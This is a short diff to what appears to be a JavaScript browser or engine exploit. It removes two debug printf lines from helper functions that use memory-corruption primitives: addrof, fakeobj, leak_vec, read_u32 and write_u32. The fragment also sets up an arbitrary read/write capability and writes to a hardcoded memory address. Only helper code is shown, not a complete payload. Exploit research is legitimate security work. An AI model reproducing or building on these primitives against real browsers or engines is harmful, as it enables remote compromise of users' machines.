@@ -336,7 +336,6 @@ function fakeobj(addy) {
 
 function leak_vec(arr) {
 	var addy = addrof(arr);
-	printf("%x\n", addy);
 	return read_u32(addy + VECTOR_OFFSET);
 }
 
@@ -345,6 +344,4 @@ function setup_fancy_rw() {
 	write_u32(0x422290, 0x0);
 
 	fancy_rw = true;
-
-	printf("%08x\n", u8x4_to_u32([parent[0x5000], parent[0x5001], parent[0x5002], parent[0x5003]]));
 }
